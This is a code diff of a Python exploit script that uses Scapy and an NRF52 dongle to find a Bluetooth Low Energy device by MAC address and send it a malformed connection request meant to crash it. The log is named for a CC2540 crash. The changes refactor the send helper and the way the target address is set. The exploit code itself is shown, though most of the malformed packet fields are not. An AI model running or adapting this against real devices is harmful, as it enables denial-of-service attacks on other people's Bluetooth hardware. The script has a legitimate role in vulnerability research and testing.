@@ -21,33 +21,13 @@ end_connection = False
 slave_addr_type = 0
 
 
-def send(scapy_pkt, print_tx=True):
-    driver.raw_send(raw(scapy_pkt))
-    if print_tx:
-        print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])
-
-
 # Autoreset colors
 colorama.init(autoreset=True)
 
-# Get serial port from command line
 if len(sys.argv) >= 2:
-    serial_port = sys.argv[1]
-elif platform.system() == 'Linux':
-    serial_port = '/dev/ttyACM0'
-elif platform.system() == 'Windows':
-    serial_port = 'COM1'
+    advertiser_address = sys.argv[1].upper()
 else:
-    print(Fore.RED + 'Platform not identified')
-    sys.exit(0)
-
-print(Fore.YELLOW + 'Serial port: ' + serial_port)
-
-# Get advertiser_address from command line (peripheral addr)
-if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].lower()
-else:
-    advertiser_address = '38:81:d7:3d:45:a2'
+    advertiser_address = 'A4:C1:38:D8:AD:B8'
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
@@ -64,7 +44,7 @@ def scan_timeout():
         scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
             ScanA=master_address,
             AdvA=advertiser_address)
-        send(scan_req)
+        driver.send(scan_req)
 
     timeout_scan = Timer(5, scan_timeout)
     timeout_scan.daemon = True
@@ -75,12 +55,12 @@ def scan_timeout():
 master_address = '5d:36:ac:90:0b:22'
 access_address = 0x9a328370
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200')
+driver = NRF52Dongle()
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
     AdvA=advertiser_address)
-send(scan_req)
+driver.send(scan_req)
 
 # Start the scan timeout to resend packets
 timeout_scan = Timer(5, scan_timeout)
@@ -113,7 +93,7 @@ while True:
         # Check if packet from advertised is received
         if pkt:
             print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
-        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower():
+        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower():
             timeout.cancel()
             slave_addr_type = pkt.TxAdd
             print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
@@ -142,7 +122,7 @@ while True:
             # chM=0x1FFFFFFFFF,
 
             # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
-            send(conn_request)
+            driver.send(conn_request)
             wrpcap('logs/CC2540_connection_req_crash.pcap', conn_request)
             print(Fore.YELLOW + 'Malformed connection request was sent')
 
